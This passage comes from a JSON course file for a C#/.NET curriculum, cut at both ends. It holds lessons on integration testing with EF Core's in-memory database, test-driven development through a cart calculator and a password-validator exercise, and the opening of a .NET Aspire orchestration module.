                  "correction": "Use Verify() for important side effects: 'mockRepo.Verify(r => r.Save(user), Times.Once)'. Especially for void methods!"
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-15-03",
          "title": "Integration Testing & Test Organization",
          "moduleId": "module-15",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Unit tests check INDIVIDUAL parts work. But do they work TOGETHER?\n\nImagine testing a bicycle:\n• UNIT TESTS: Test brake pads, gears, wheels separately\n• INTEGRATION TESTS: Test brakes + wheels together - does braking actually stop the bike?\n\nTYPES OF TESTS:\n1. UNIT TESTS (70-80%)\n   - Test one class in isolation\n   - Fast, run in milliseconds\n   - Mock all dependencies\n\n2. INTEGRATION TESTS (15-20%)\n   - Test multiple components together\n   - May use real database (in-memory)\n   - Slower but more realistic\n\n3. END-TO-END TESTS (5-10%)\n   - Test entire application\n   - Real browser, real API calls\n   - Slowest but highest confidence\n\nTEST PYRAMID:\n   /\\\\    E2E (few)\n  /  \\\\\n /____\\\\  Integration (some)\n/______\\\\  Unit (many)\n\nThink: 'Unit tests for speed, integration tests for confidence, E2E tests for critical paths!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== PROJECT STRUCTURE =====\n// src/\n//   MyApp/\n//     Services/\n//       UserService.cs\n//     Data/\n//       AppDbContext.cs\n// tests/\n//   MyApp.Tests/\n//     Unit/\n//       UserServiceTests.cs\n//     Integration/\n//       UserServiceIntegrationTests.cs\n\nusing Xunit;\nusing Microsoft.EntityFrameworkCore;\n\n// ===== THE DBCONTEXT =====\npublic class AppDbContext : DbContext\n{\n    public AppDbContext(DbContextOptions<AppDbContext> options) \n        : base(options) { }\n    \n    public DbSet<User> Users { get; set; }\n}\n\npublic class User\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public string Email { get; set; }\n}\n\npublic class UserService\n{\n    private readonly AppDbContext _context;\n    \n    public UserService(AppDbContext context)\n    {\n        _context = context;\n    }\n    \n    public User CreateUser(string name, string email)\n    {\n        var user = new User { Name = name, Email = email };\n        _context.Users.Add(user);\n        _context.SaveChanges();\n        return user;\n    }\n    \n    public User GetByEmail(string email)\n    {\n        return _context.Users.FirstOrDefault(u => u.Email == email);\n    }\n}\n\n// ===== INTEGRATION TESTS with In-Memory Database =====\npublic class UserServiceIntegrationTests : IDisposable\n{\n    private readonly AppDbContext _context;\n    private readonly UserService _service;\n    \n    public UserServiceIntegrationTests()\n    {\n        // Use in-memory database for tests\n        var options = new DbContextOptionsBuilder<AppDbContext>()\n            .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())\n            .Options;\n        \n        _context = new AppDbContext(options);\n        _service = new UserService(_context);\n    }\n    \n    [Fact]\n    public void CreateUser_ValidData_PersistsToDatabase()\n    {\n        // Act\n        var user = _service.CreateUser(\"John\", \"john@test.com\");\n        \n        // Assert - Actually query the database!\n        var dbUser = _context.Users.Find(user.Id);\n        Assert.NotNull(dbUser);\n        Assert.Equal(\"John\", dbUser.Name);\n    }\n    \n    [Fact]\n    public void GetByEmail_UserExists_ReturnsUser()\n    {\n        // Arrange - Create user first\n        _service.CreateUser(\"Jane\", \"jane@test.com\");\n        \n        // Act\n        var found = _service.GetByEmail(\"jane@test.com\");\n        \n        // Assert\n        Assert.NotNull(found);\n        Assert.Equal(\"Jane\", found.Name);\n    }\n    \n    [Fact]\n    public void GetByEmail_UserNotExists_ReturnsNull()\n    {\n        var found = _service.GetByEmail(\"nobody@test.com\");\n        Assert.Null(found);\n    }\n    \n    // IDisposable - cleanup after each test\n    public void Dispose()\n    {\n        _context.Dispose();\n    }\n}\n\n// ===== TEST ORGANIZATION TIPS =====\n// 1. Mirror source structure in test project\n// 2. One test class per class being tested\n// 3. Use folders: Unit/, Integration/, E2E/\n// 4. Naming: [ClassName]Tests.cs\n// 5. Use IClassFixture<T> for shared setup across tests\n\nConsole.WriteLine(\"Integration test patterns defined!\");\nConsole.WriteLine(\"Key: Use in-memory database for EF Core integration tests\");\nConsole.WriteLine(\"IDisposable ensures cleanup between tests\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`UseInMemoryDatabase(name)`**: EF Core in-memory provider for testing. Fast, no external DB needed. Use unique name (Guid) per test to ensure isolation.\n\n**`IDisposable`**: Implement Dispose() for cleanup. xUnit calls Dispose() after each test method. Perfect for cleaning up DbContext, connections, files.\n\n**`[Collection(name)]`**: Share fixtures across test classes. Tests in same collection don't run in parallel. Useful for shared database state.\n\n**`IClassFixture<T>`**: Shared setup/teardown for all tests in a class. Create expensive resources once, share across tests. Fixture disposed after all tests complete.\n\n**`IAsyncLifetime`**: Async setup/teardown. Use InitializeAsync() and DisposeAsync() for async operations like database seeding.\n\n**`[Trait(name, value)]`**: Categorize tests. Example: [Trait(\"Category\", \"Integration\")]. Filter in test runner: 'dotnet test --filter Category=Integration'."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**In-Memory Database Limitations**: EF Core in-memory provider doesn't enforce foreign keys, unique constraints, or transactions like a real database! Use Testcontainers for realistic integration tests.\n\n**Testcontainers for Real Databases**: `dotnet add package Testcontainers.PostgreSql` - spins up actual Docker containers for tests. More realistic than in-memory: `var container = new PostgreSqlBuilder().Build(); await container.StartAsync();`\n\n**Code Coverage with Coverlet**: Track test coverage with `dotnet add package coverlet.collector` then `dotnet test --collect:\"XPlat Code Coverage\"`. Aim for 80%+ on critical paths, not 100% everywhere.\n\n**ICollectionFixture for Expensive Resources**: Use `ICollectionFixture<T>` when multiple test classes need the same fixture (like a shared database). Faster than recreating per class.\n\n**WebApplicationFactory for API Testing**: For ASP.NET Core integration tests, use `WebApplicationFactory<Program>` to spin up a test server: `var client = _factory.CreateClient();` - tests real HTTP pipeline."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-15-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create integration tests for a ProductRepository!\n\n1. Create Product class: Id, Name, Price, InStock (bool)\n\n2. Create ProductRepository class:\n   - Constructor takes DbContext\n   - AddProduct(Product) - adds to database\n   - GetInStock() - returns products where InStock = true\n   - GetByPriceRange(min, max) - returns products in price range\n\n3. Write integration tests using in-memory database:\n   - Test AddProduct persists correctly\n   - Test GetInStock returns only in-stock products\n   - Test GetByPriceRange filters correctly\n   - Implement IDisposable for cleanup\n\nUse UseInMemoryDatabase and seed test data!",
              "starterCode": "using Xunit;\nusing Microsoft.EntityFrameworkCore;\nusing System.Collections.Generic;\nusing System.Linq;\n\npublic class Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n    public bool InStock { get; set; }\n}\n\npublic class ProductDbContext : DbContext\n{\n    public ProductDbContext(DbContextOptions<ProductDbContext> options) \n        : base(options) { }\n    \n    public DbSet<Product> Products { get; set; }\n}\n\npublic class ProductRepository\n{\n    private readonly ProductDbContext _context;\n    \n    public ProductRepository(ProductDbContext context)\n    {\n        _context = context;\n    }\n    \n    public void AddProduct(Product product)\n    {\n        // Implement\n    }\n    \n    public List<Product> GetInStock()\n    {\n        // Implement: return products where InStock = true\n        return new List<Product>();\n    }\n    \n    public List<Product> GetByPriceRange(decimal min, decimal max)\n    {\n        // Implement: return products in price range\n        return new List<Product>();\n    }\n}\n\npublic class ProductRepositoryIntegrationTests : IDisposable\n{\n    private readonly ProductDbContext _context;\n    private readonly ProductRepository _repo;\n    \n    public ProductRepositoryIntegrationTests()\n    {\n        // Setup in-memory database\n        var options = new DbContextOptionsBuilder<ProductDbContext>()\n            .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())\n            .Options;\n        \n        _context = new ProductDbContext(options);\n        _repo = new ProductRepository(_context);\n    }\n    \n    [Fact]\n    public void AddProduct_ValidProduct_PersistsToDatabase()\n    {\n        // Write test\n    }\n    \n    public void Dispose()\n    {\n        _context.Dispose();\n    }\n}",
              "solution": "using Xunit;\nusing Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\npublic class Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n    public bool InStock { get; set; }\n}\n\npublic class ProductDbContext : DbContext\n{\n    public ProductDbContext(DbContextOptions<ProductDbContext> options) \n        : base(options) { }\n    \n    public DbSet<Product> Products { get; set; }\n}\n\npublic class ProductRepository\n{\n    private readonly ProductDbContext _context;\n    \n    public ProductRepository(ProductDbContext context)\n    {\n        _context = context;\n    }\n    \n    public void AddProduct(Product product)\n    {\n        _context.Products.Add(product);\n        _context.SaveChanges();\n    }\n    \n    public List<Product> GetInStock()\n    {\n        return _context.Products.Where(p => p.InStock).ToList();\n    }\n    \n    public List<Product> GetByPriceRange(decimal min, decimal max)\n    {\n        return _context.Products\n            .Where(p => p.Price >= min && p.Price <= max)\n            .ToList();\n    }\n}\n\npublic class ProductRepositoryIntegrationTests : IDisposable\n{\n    private readonly ProductDbContext _context;\n    private readonly ProductRepository _repo;\n    \n    public ProductRepositoryIntegrationTests()\n    {\n        var options = new DbContextOptionsBuilder<ProductDbContext>()\n            .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())\n            .Options;\n        \n        _context = new ProductDbContext(options);\n        _repo = new ProductRepository(_context);\n    }\n    \n    [Fact]\n    public void AddProduct_ValidProduct_PersistsToDatabase()\n    {\n        var product = new Product { Name = \"Laptop\", Price = 999m, InStock = true };\n        \n        _repo.AddProduct(product);\n        \n        var dbProduct = _context.Products.First();\n        Assert.Equal(\"Laptop\", dbProduct.Name);\n        Assert.Equal(999m, dbProduct.Price);\n    }\n    \n    [Fact]\n    public void GetInStock_MixedProducts_ReturnsOnlyInStock()\n    {\n        _repo.AddProduct(new Product { Name = \"A\", Price = 10, InStock = true });\n        _repo.AddProduct(new Product { Name = \"B\", Price = 20, InStock = false });\n        _repo.AddProduct(new Product { Name = \"C\", Price = 30, InStock = true });\n        \n        var inStock = _repo.GetInStock();\n        \n        Assert.Equal(2, inStock.Count);\n        Assert.All(inStock, p => Assert.True(p.InStock));\n    }\n    \n    [Fact]\n    public void GetByPriceRange_ProductsExist_FiltersCorrectly()\n    {\n        _repo.AddProduct(new Product { Name = \"Cheap\", Price = 10, InStock = true });\n        _repo.AddProduct(new Product { Name = \"Mid\", Price = 50, InStock = true });\n        _repo.AddProduct(new Product { Name = \"Expensive\", Price = 100, InStock = true });\n        \n        var result = _repo.GetByPriceRange(20, 80);\n        \n        Assert.Single(result);\n        Assert.Equal(\"Mid\", result[0].Name);\n    }\n    \n    public void Dispose()\n    {\n        _context.Dispose();\n    }\n}\n\nConsole.WriteLine(\"Integration tests with in-memory DB defined!\");\nConsole.WriteLine(\"Tests: AddProduct, GetInStock, GetByPriceRange\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain integration tests",
                  "expectedOutput": "Integration",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention products",
                  "expectedOutput": "Product",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "UseInMemoryDatabase with unique name: 'databaseName: Guid.NewGuid().ToString()' ensures test isolation."
                },
                {
                  "level": 2,
                  "text": "Implement IDisposable and call _context.Dispose() to clean up after tests."
                },
                {
                  "level": 3,
                  "text": "Seed test data in tests, not constructor. Each test should set up its own data for isolation."
                },
                {
                  "level": 4,
                  "text": "Assert.All() checks all items in collection: 'Assert.All(list, item => Assert.True(item.Property))'."
                },
                {
                  "level": 5,
                  "text": "Use [Trait] to categorize: '[Trait(\"Category\", \"Integration\")]' then filter with 'dotnet test --filter Category=Integration'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Same database name for all tests",
                  "consequence": "Tests share data and affect each other! Test A adds user, Test B expects empty database but finds user. Flaky, order-dependent tests.",
                  "correction": "Use Guid.NewGuid().ToString() for database name. Each test gets isolated database."
                },
                {
                  "mistake": "Not disposing DbContext",
                  "consequence": "Memory leaks, connection exhaustion. In-memory OK but bad habit for real databases.",
                  "correction": "Implement IDisposable, call _context.Dispose() in Dispose() method."
                },
                {
                  "mistake": "Testing EF Core instead of your code",
                  "consequence": "Tests verify LINQ works, not your business logic. 'Assert.Equal(1, context.Users.Count())' tests EF, not your service.",
                  "correction": "Test YOUR code's behavior. Mock DbContext in unit tests, use in-memory only for integration tests of actual database interactions."
                },
                {
                  "mistake": "Too many integration tests",
                  "consequence": "Slow test suite! Integration tests with DB are 10-100x slower than unit tests. Test pyramid inverted.",
                  "correction": "Integration tests for critical paths and DB-specific logic. Unit tests with mocks for business logic."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-15-04",
          "title": "Test-Driven Development (Red-Green-Refactor)",
          "moduleId": "module-15",
          "order": 4,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding TDD",
              "content": "Imagine you're an architect building a house. Would you start hammering nails before drawing blueprints? Of course not! Test-Driven Development (TDD) applies this same principle to code: you write the test (the blueprint) BEFORE you write the implementation.\n\nThe TDD cycle follows three simple steps, known as Red-Green-Refactor:\n\n1. RED: Write a failing test first. The test describes what you WANT the code to do, but since the code doesn't exist yet, the test fails (shows red in most test runners).\n\n2. GREEN: Write the MINIMUM code needed to make the test pass. Don't over-engineer - just enough to turn that red light green.\n\n3. REFACTOR: Now that tests pass, clean up your code. Remove duplication, improve names, simplify logic. The tests protect you - if you break something, they'll catch it!\n\nWhy start with tests? Because tests written AFTER code often just verify what you already wrote, not what you actually need. Tests written FIRST force you to think about the interface, edge cases, and requirements BEFORE getting lost in implementation details.\n\nThink: 'TDD is like GPS navigation - you decide the destination before you start driving!'"
            },
            {
              "type": "EXAMPLE",
              "title": "TDD in Action: ShopFlow Cart Total",
              "content": "Let's build a shopping cart calculator using TDD. We'll go through each step of Red-Green-Refactor.",
              "code": "using Xunit;\n\n// ===== STEP 1: RED - Write a Failing Test =====\n// We want a CartCalculator that calculates totals\n// Start by describing what we WANT, not what exists!\n\npublic class CartCalculatorTests\n{\n    [Fact]\n    public void CalculateTotal_SingleItem_ReturnsItemPrice()\n    {\n        // Arrange\n        var calculator = new CartCalculator();\n        var items = new List<CartItem>\n        {\n            new CartItem(\"Widget\", 10.00m, 1)\n        };\n        \n        // Act\n        decimal total = calculator.CalculateTotal(items);\n        \n        // Assert\n        Assert.Equal(10.00m, total);\n    }\n    // This test FAILS - CartCalculator doesn't exist yet! (RED)\n}\n\n// ===== STEP 2: GREEN - Minimal Implementation =====\n// Write JUST ENOUGH code to pass the test\n\npublic record CartItem(string Name, decimal Price, int Quantity);\n\npublic class CartCalculator\n{\n    public decimal CalculateTotal(List<CartItem> items)\n    {\n        // Simplest thing that works:\n        return items.Sum(i => i.Price * i.Quantity);\n    }\n}\n// Test now PASSES! (GREEN)\n\n// ===== STEP 3: Add More Tests, Repeat Cycle =====\n\npublic class CartCalculatorTests_Extended\n{\n    private readonly CartCalculator _calculator = new();\n    \n    [Fact]\n    public void CalculateTotal_MultipleItems_ReturnsSumOfAll()\n    {\n        var items = new List<CartItem>\n        {\n            new CartItem(\"Widget\", 10.00m, 2),   // 20.00\n            new CartItem(\"Gadget\", 25.00m, 1)    // 25.00\n        };\n        \n        Assert.Equal(45.00m, _calculator.CalculateTotal(items));\n    }\n    \n    [Fact]\n    public void CalculateTotal_EmptyCart_ReturnsZero()\n    {\n        var items = new List<CartItem>();\n        Assert.Equal(0m, _calculator.CalculateTotal(items));\n    }\n    \n    [Fact]\n    public void CalculateTotal_WithDiscount_AppliesDiscount()\n    {\n        // RED: This test fails - no discount support yet!\n        var items = new List<CartItem>\n        {\n            new CartItem(\"Widget\", 100.00m, 1)\n        };\n        \n        decimal total = _calculator.CalculateTotal(items, discountPercent: 10);\n        \n        Assert.Equal(90.00m, total); // 100 - 10% = 90\n    }\n}\n\n// ===== GREEN: Add discount support =====\npublic class CartCalculatorWithDiscount\n{\n    public decimal CalculateTotal(List<CartItem> items, decimal discountPercent = 0)\n    {\n        decimal subtotal = items.Sum(i => i.Price * i.Quantity);\n        decimal discount = subtotal * (discountPercent / 100);\n        return subtotal - discount;\n    }\n}\n\n// ===== REFACTOR: Clean up the code =====\npublic class CartCalculatorRefactored\n{\n    public decimal CalculateTotal(List<CartItem> items, decimal discountPercent = 0)\n    {\n        decimal subtotal = CalculateSubtotal(items);\n        return ApplyDiscount(subtotal, discountPercent);\n    }\n    \n    private decimal CalculateSubtotal(List<CartItem> items)\n        => items.Sum(i => i.Price * i.Quantity);\n    \n    private decimal ApplyDiscount(decimal amount, decimal percent)\n        => amount * (1 - percent / 100);\n}\n// Tests still pass! Safe refactoring.\n\nConsole.WriteLine(\"TDD Cycle Complete!\");\nConsole.WriteLine(\"1. RED: Write failing test\");\nConsole.WriteLine(\"2. GREEN: Make it pass (minimal code)\");\nConsole.WriteLine(\"3. REFACTOR: Clean up (tests protect you)\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Why TDD Works",
              "content": "## The Science Behind TDD\n\nTest-Driven Development isn't just a trendy methodology - it's a disciplined approach that delivers measurable benefits:\n\n**1. Design Feedback Loop**\nWhen you write tests first, you immediately discover if your API is awkward to use. Difficult-to-test code is often difficult-to-use code. TDD forces you to design for usability because YOU are the first user of your own code. If setting up a test requires 20 lines of boilerplate, your real callers will suffer the same pain.\n\n**2. Executable Specification**\nTests written before code serve as living documentation. They describe WHAT the code should do in precise, executable terms. Unlike comments or documentation that can become stale, tests fail when they don't match reality. New team members can read tests to understand expected behavior.\n\n**3. Confidence to Refactor**\nWith comprehensive tests, you can fearlessly improve code structure. Rename methods, extract classes, simplify algorithms - if tests pass, you haven't broken anything. Without tests, refactoring becomes risky surgery. With TDD, it's routine maintenance.\n\n**4. Reduced Debugging Time**\nBugs caught by tests are found immediately, in the context where you wrote the code. Bugs found later require you to reload mental context. Studies show TDD reduces defect density by 40-80%. The time 'lost' writing tests is recovered many times over in reduced debugging.\n\n**The TDD Mantra**\n'Red, Green, Refactor' - repeat this cycle in short iterations (minutes, not hours). Small steps mean small mistakes. Each cycle adds one small, verified piece of functionality. The result: a codebase that grows steadily with confidence.\n\n**When TDD Shines**\nTDD is particularly valuable for: business logic with clear inputs/outputs, API design (forces good interfaces), bug fixes (write test that reproduces bug first), and legacy code modification (add tests before changing)."
            },
            {
              "type": "WARNING",
              "title": "Common TDD Mistakes",
              "content": "## TDD Anti-Patterns to Avoid\n\n**1. Writing Too Much Test Code at Once**\nThe RED phase should be ONE failing test, not ten. If you write many tests before any implementation, you've lost the rapid feedback loop. One test, one implementation, one refactor - repeat.\n\n**2. Skipping the RED Phase**\nAlways see your test FAIL first! A test that never failed might not test what you think. If you write implementation first 'just to see how it works,' you've abandoned TDD and lost its design benefits.\n\n**3. Over-Engineering in GREEN**\nGREEN means MINIMAL code to pass. Don't add features the test doesn't require. Don't optimize. Don't handle edge cases you haven't tested yet. Write the simplest thing that works:\n\n```csharp\n// BAD - Over-engineered for one test\npublic decimal Calculate(List<Item> items) {\n    if (items == null) throw new ArgumentNullException();\n    if (!items.Any()) return 0;\n    return items.Where(i => i.IsValid).Sum(i => i.Total);\n}\n\n// GOOD - Just enough for current test\npublic decimal Calculate(List<Item> items) {\n    return items.Sum(i => i.Price);\n}\n```\n\n**4. Skipping the REFACTOR Phase**\nAfter GREEN, you MUST consider refactoring. Code that 'just works' accumulates technical debt. Refactor while context is fresh and tests protect you.\n\n**5. Testing Implementation Instead of Behavior**\nTest WHAT code does, not HOW it does it:\n\n```csharp\n// BAD - Tests implementation details\nAssert.True(calculator._internalCache.ContainsKey(\"total\"));\n\n// GOOD - Tests observable behavior\nAssert.Equal(100m, calculator.GetTotal());\n```\n\nImplementation-focused tests break when you refactor, even if behavior is unchanged. Behavior-focused tests let you freely restructure internals."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-15-04-challenge-01",
              "title": "TDD Practice: Password Validator",
              "description": "Apply Test-Driven Development to build a password validator step by step.",
              "instructions": "Build a PasswordValidator using TDD!\n\nRequirements (implement one at a time with TDD):\n1. Password must be at least 8 characters\n2. Password must contain at least one uppercase letter\n3. Password must contain at least one digit\n4. Password must contain at least one special character (!@#$%^&*)\n\nTDD Process:\n1. Write a failing test for requirement 1\n2. Implement minimum code to pass\n3. Refactor if needed\n4. Repeat for each requirement\n\nCreate:\n- PasswordValidator class with Validate(string password) method\n- Return a ValidationResult with IsValid and ErrorMessages\n- Write tests for valid passwords and each failure case",
              "starterCode": "using Xunit;\nusing System.Collections.Generic;\n\npublic class ValidationResult\n{\n    public bool IsValid { get; set; }\n    public List<string> ErrorMessages { get; set; } = new();\n}\n\npublic class PasswordValidator\n{\n    public ValidationResult Validate(string password)\n    {\n        // TODO: Implement using TDD\n        // Start with just length check, then add others\n        return new ValidationResult { IsValid = false };\n    }\n}\n\npublic class PasswordValidatorTests\n{\n    private readonly PasswordValidator _validator = new();\n    \n    // STEP 1: Test for minimum length (RED first!)\n    [Fact]\n    public void Validate_PasswordTooShort_ReturnsInvalid()\n    {\n        var result = _validator.Validate(\"Ab1!\");\n        \n        Assert.False(result.IsValid);\n        Assert.Contains(result.ErrorMessages, \n            m => m.Contains(\"8 characters\"));\n    }\n    \n    [Fact]\n    public void Validate_ValidPassword_ReturnsValid()\n    {\n        var result = _validator.Validate(\"SecureP@ss1\");\n        \n        Assert.True(result.IsValid);\n        Assert.Empty(result.ErrorMessages);\n    }\n    \n    // TODO: Add tests for uppercase, digit, special character\n}",
              "solution": "using Xunit;\nusing System.Collections.Generic;\nusing System.Linq;\n\npublic class ValidationResult\n{\n    public bool IsValid { get; set; }\n    public List<string> ErrorMessages { get; set; } = new();\n}\n\npublic class PasswordValidator\n{\n    public ValidationResult Validate(string password)\n    {\n        var result = new ValidationResult { IsValid = true };\n        \n        // Requirement 1: Minimum length\n        if (password.Length < 8)\n        {\n            result.IsValid = false;\n            result.ErrorMessages.Add(\"Password must be at least 8 characters\");\n        }\n        \n        // Requirement 2: Uppercase letter\n        if (!password.Any(char.IsUpper))\n        {\n            result.IsValid = false;\n            result.ErrorMessages.Add(\"Password must contain at least one uppercase letter\");\n        }\n        \n        // Requirement 3: Digit\n        if (!password.Any(char.IsDigit))\n        {\n            result.IsValid = false;\n            result.ErrorMessages.Add(\"Password must contain at least one digit\");\n        }\n        \n        // Requirement 4: Special character\n        var specialChars = \"!@#$%^&*\";\n        if (!password.Any(c => specialChars.Contains(c)))\n        {\n            result.IsValid = false;\n            result.ErrorMessages.Add(\"Password must contain at least one special character (!@#$%^&*)\");\n        }\n        \n        return result;\n    }\n}\n\npublic class PasswordValidatorTests\n{\n    private readonly PasswordValidator _validator = new();\n    \n    [Fact]\n    public void Validate_PasswordTooShort_ReturnsInvalid()\n    {\n        var result = _validator.Validate(\"Ab1!\");\n        \n        Assert.False(result.IsValid);\n        Assert.Contains(result.ErrorMessages, m => m.Contains(\"8 characters\"));\n    }\n    \n    [Fact]\n    public void Validate_NoUppercase_ReturnsInvalid()\n    {\n        var result = _validator.Validate(\"lowercase1!\");\n        \n        Assert.False(result.IsValid);\n        Assert.Contains(result.ErrorMessages, m => m.Contains(\"uppercase\"));\n    }\n    \n    [Fact]\n    public void Validate_NoDigit_ReturnsInvalid()\n    {\n        var result = _validator.Validate(\"NoDigits!!\");\n        \n        Assert.False(result.IsValid);\n        Assert.Contains(result.ErrorMessages, m => m.Contains(\"digit\"));\n    }\n    \n    [Fact]\n    public void Validate_NoSpecialChar_ReturnsInvalid()\n    {\n        var result = _validator.Validate(\"NoSpecial1A\");\n        \n        Assert.False(result.IsValid);\n        Assert.Contains(result.ErrorMessages, m => m.Contains(\"special\"));\n    }\n    \n    [Fact]\n    public void Validate_ValidPassword_ReturnsValid()\n    {\n        var result = _validator.Validate(\"SecureP@ss1\");\n        \n        Assert.True(result.IsValid);\n        Assert.Empty(result.ErrorMessages);\n    }\n    \n    [Fact]\n    public void Validate_MultipleErrors_ReturnsAllErrors()\n    {\n        var result = _validator.Validate(\"bad\");\n        \n        Assert.False(result.IsValid);\n        Assert.True(result.ErrorMessages.Count >= 3);\n    }\n}\n\nConsole.WriteLine(\"TDD Password Validator Complete!\");\nConsole.WriteLine(\"Tests cover: length, uppercase, digit, special char\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm TDD implementation",
                  "expectedOutput": "TDD",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention password validation",
                  "expectedOutput": "Password",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with ONE requirement. Write a test that fails, then make it pass. Don't add all validations at once!"
                },
                {
                  "level": 2,
                  "text": "Use LINQ methods: password.Any(char.IsUpper), password.Any(char.IsDigit) for character checks."
                },
                {
                  "level": 3,
                  "text": "Return ALL error messages, not just the first. Users want to know everything wrong at once."
                },
                {
                  "level": 4,
                  "text": "Assert.Contains with a predicate: Assert.Contains(list, item => item.Contains('text')) checks if any item matches."
                },
                {
                  "level": 5,
                  "text": "After all tests pass, REFACTOR: extract validation rules into separate methods for cleaner code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Writing all tests before any implementation",
                  "consequence": "You lose the TDD feedback loop! 10 red tests don't give you design feedback like 1 red test at a time.",
                  "correction": "One test at a time: RED (one test fails) -> GREEN (pass it) -> REFACTOR -> repeat."
                },
                {
                  "mistake": "Not seeing the test fail first",
                  "consequence": "A test that never failed might not test what you think! It could be testing the wrong thing or always pass.",
                  "correction": "ALWAYS run the test before implementing. See it fail with the expected failure message."
                },
                {
                  "mistake": "Implementing more than the test requires",
                  "consequence": "You're guessing at requirements instead of letting tests drive them. Extra code means extra bugs.",
                  "correction": "GREEN means MINIMUM code. If test only checks length, only implement length check."
                },
                {
                  "mistake": "Returning on first error instead of collecting all",
                  "consequence": "User fixes one error, submits, gets another error. Frustrating! Collect all errors in one pass.",
                  "correction": "Check ALL validations, collect errors in a list, return complete ValidationResult."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-16",
      "title": "Building Cloud-Native Apps with .NET Aspire",
      "description": "Orchestrate distributed applications with .NET Aspire. Learn service discovery, centralized dashboards, OpenTelemetry integration, and production deployment patterns.",
      "difficulty": "advanced",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-16-01",
          "title": "What is .NET Aspire? (The Orchestration Layer)",
          "moduleId": "module-16",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're conducting an orchestra. Each musician (microservice) plays their part, but someone needs to coordinate when they start, ensure they can hear each other, and make sure the whole performance sounds harmonious.\n\n.NET Aspire is that CONDUCTOR for your cloud apps!\n\nTRADITIONAL CLOUD DEVELOPMENT:\n- Manually configure each service\n- Set up networking between services\n- Configure logging, metrics separately\n- Hope everything works together\n\n.NET ASPIRE APPROACH:\n- ONE place to define your entire app\n- Automatic service discovery\n- Built-in observability dashboard\n- Local development mirrors production\n\nKEY CONCEPTS:\n- AppHost: The conductor - orchestrates all services\n- ServiceDefaults: Shared configuration for all services\n- Components: Pre-built integrations (Redis, Postgres, etc.)\n- Dashboard: Real-time view of your entire system\n\nThink: 'Aspire turns a chaotic band of services into a well-coordinated orchestra!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== PROJECT STRUCTURE =====\n// MyApp.sln\n//   MyApp.AppHost/        <- The orchestrator (conductor)\n//   MyApp.ServiceDefaults/ <- Shared configuration\n//   MyApp.Api/             <- Your API service\n//   MyApp.Web/             <- Your web frontend\n\n// ===== AppHost/Program.cs =====\n// This is the HEART of .NET Aspire - defines your entire app!\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// Add infrastructure components\nvar cache = builder.AddRedis(\"cache\");\nvar db = builder.AddPostgres(\"postgres\")\n    .AddDatabase(\"catalogdb\");\n\n// Add your API project with references to infrastructure\nvar api = builder.AddProject<Projects.CatalogApi>(\"api\")\n    .WithReference(cache)    // API can access Redis\n    .WithReference(db);      // API can access Postgres\n\n// Add web frontend that talks to the API\nbuilder.AddProject<Projects.WebApp>(\"webapp\")\n    .WithReference(api);     // Web can call API\n\nbuilder.Build().Run();\n\n// ===== WHAT ASPIRE DOES FOR YOU =====\n// 1. Starts Redis container automatically\n// 2. Starts Postgres container automatically\n// 3. Configures connection strings\n// 4. Sets up service discovery (webapp knows api URL)\n// 5. Launches dashboard at http://localhost:18888\n\n// ===== ServiceDefaults/Extensions.cs =====\npublic static class Extensions\n{\n    public static IHostApplicationBuilder AddServiceDefaults(\n        this IHostApplicationBuilder builder)\n    {\n        // OpenTelemetry for logging, metrics, traces\n        builder.ConfigureOpenTelemetry();\n        \n        // Health checks\n        builder.AddDefaultHealthChecks();\n        \n        // Service discovery\n        builder.Services.AddServiceDiscovery();\n        \n        // Resilient HTTP clients\n        builder.Services.ConfigureHttpClientDefaults(http =>\n        {\n            http.AddStandardResilienceHandler();\n            http.AddServiceDiscovery();\n        });\n        \n        return builder;\n    }\n}\n\n// ===== In your API's Program.cs =====\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add Aspire service defaults (one line!)\nbuilder.AddServiceDefaults();\n\n// Add Redis cache (connection string 